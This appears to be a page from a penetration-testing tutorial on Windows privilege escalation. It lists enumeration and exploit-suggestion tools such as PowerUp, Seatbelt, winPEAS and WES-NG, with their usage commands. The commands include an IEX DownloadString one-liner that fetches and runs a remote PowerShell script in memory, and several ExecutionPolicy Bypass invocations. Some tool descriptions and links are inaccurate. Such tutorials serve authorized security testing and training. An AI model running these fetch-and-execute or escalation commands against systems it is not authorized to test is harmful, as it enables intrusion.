# Tools

## Tools Overview

This portion of the Windows Privilege Escalation Tutorial provides an organized overview of enumeration and exploitation tools used for privilege Escalation on Windows systems.

### Enumeration Tools

These tools are essential for identifying vulnerabilities and misconfigurations that could lead to privilege escalation.

| Tool                                                                                                              | Description                                                                                          |
| ----------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| [PowerSploit's PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell script for identifying and exploiting local privilege escalation vulnerabilities.         |
| [Watson](https://github.com/rasta-mouse/Watson)                                                                   | C# implementation for detecting vulnerabilities in Windows, similar to the deprecated Sherlock tool. |
| [Sherlock (Deprecated)](https://github.com/sherlock-project/sherlock)                                             | PowerShell script for identifying missing patches for privilege escalation.                          |
| [BeRoot](https://github.com/AlessandroZ/BeRoot)                                                                   | Cross-platform tool for privilege escalation checks on Windows, Linux, and macOS.                    |
| [Windows Exploit Suggester (WES)](https://github.com/bitsadmin/wesng)                                             | Suggests potential exploits based on system information and installed patches.                       |
| [WindowsEnum](https://github.com/absolomb/WindowsEnum)                                                            | PowerShell script for privilege escalation enumeration in Windows.                                   |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                                 | C# project for auditing security-related settings and configurations on Windows systems.             |
| [Powerless](https://github.com/gladiatx0r/Powerless)                                                              | Script focused on legacy Windows environments for privilege escalation enumeration.                  |
| [JAWS (Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)                                       | PowerShell script for comprehensive Windows enumeration.                                             |
| [winPEAS](https://winpeas.com/)                                                                                   | Script for identifying privilege escalation vectors in Windows OS.                                   |
| [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)                        | Updated version of WES for accurate exploit suggestions.                                             |
| [PrivescCheck](https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1)                   | Standalone executable for checking common privilege escalation vectors in Windows OS.                |

### <mark style="color:yellow;">1.</mark> Privilege Escalation Techniques

#### <mark style="color:yellow;">1.1</mark> Enumeration Tools: Usage Instructions

The following section details how to use specific enumeration Tools to gather system information and identify potential vulnerabilities.

#### <mark style="color:yellow;">1.2</mark> PowerSploit's PowerUp

Usage:

```ps
IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerSploit/master/Privesc/PowerUp.ps1')
```

#### <mark style="color:yellow;">1.3</mark> Watson

Usage:

Compile or download Watson to use in .NET environments.

#### <mark style="color:yellow;">1.4</mark> Windows Exploit Suggester (WES)

Initial Steps:

```ps
systeminfo > systeminfo.txt
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-
mssb.xlsx --systeminfo systeminfo.txt
```

#### <mark style="color:yellow;">1.5</mark> Seatbelt

Full Security Check:

```ps
Seatbelt.exe -group=all -full
```

#### <mark style="color:yellow;">1.6</mark> winPEAS

Usage:

Download and execute winPEAS on the target machine.

### <mark style="color:yellow;">2.</mark> Exploitation Tools

Once vulnerabilities are identified, these tools can assist you in exploiting them.

#### <mark style="color:yellow;">2.1</mark> BeRoot

Usage:

Run the appropriate version for the target OS and follow prompts for privilege escalation checks.

#### <mark style="color:yellow;">2.2</mark> PrivescCheck

Usage:

```ps1
powershell -ExecutionPolicy Bypass -File .\PrivescCheck.ps1
powershell -ExecutionPolicy Bypass -File .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
```

#### <mark style="color:yellow;">2.3</mark> JAWS

Usage:

```ps
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

#### <mark style="color:yellow;">2.4</mark> Windows Exploit Suggester - Next Generation (WES-NG)

Usage:

```py
python3 wes.py --update
python3 wes.py systeminfo.txt
```

### <mark style="color:yellow;">3.</mark> Usage Instructions

#### <mark style="color:yellow;">3.1</mark> Initial System Information Gathering

Begin by collecting essential system information for analysis and exploitation strategy development:

```
systeminfo > systeminfo.txt
```

#### <mark style="color:yellow;">3.2</mark> Updating and Running Windows Exploit Suggester

Update the Windows Exploit Suggester database and analyze the collected system information:

```
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py systeminfo.txt
```

#### <mark style="color:yellow;">3.3</mark> Running Seatbelt for a Comprehensive Check

Conduct a full Security audit using Seatbelt:

```
Seatbelt.exe -group=all -full - 
outputfile="C:\Temp\seatbelt_report.txt"
```

#### <mark style="color:yellow;">3.4</mark> Executing PowerUp

Scan for privilege escalation vulnerabilities by using PowerSploit's PowerUp:

```powershell
IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerSploit/master/Privesc/PowerUp.ps1')
```
